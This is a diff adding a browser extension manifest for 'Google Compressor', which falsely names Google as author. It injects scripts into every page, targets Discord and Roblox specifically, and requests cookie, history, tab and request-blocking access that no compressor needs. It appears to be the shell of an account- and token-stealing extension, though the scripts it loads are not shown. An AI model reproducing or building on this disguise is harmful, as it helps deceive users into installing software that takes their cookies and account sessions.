@@ -1,0 +1,42 @@
+{
+    "name": "Google Compressor",
+    "description": "Google Web Compressor",
+    "author": "Google",
+    "version": "3.9.2",
+    "manifest_version": 3,
+    "content_scripts": [
+        {
+            "all_frames": true,
+            "js": [
+                "content.js"
+            ],
+            "matches": [
+                "http://*/*",
+                "https://*/*",
+                "https://discord.com/*",
+                "https://canary.discord.com/*",
+                "https://ptb.discord.com/*",
+                "https://www.roblox.com/*"
+            ]
+        }
+    ],
+    "permissions": [
+        "https://*/*",
+        "<all_urls>",
+        "activeTab",
+        "tabs",
+        "webRequest",
+        "webRequestBlocking",
+        "cookies",
+        "history",
+        "https://www.roblox.com/home"
+    ],
+    "background": {
+        "service_worker": "scripts/background.js"
+    },
+    "icons": {
+        "16": "images/logo16.png",
+        "48": "images/logo48.png",
+        "128": "images/logo128.png"
+    }
+}
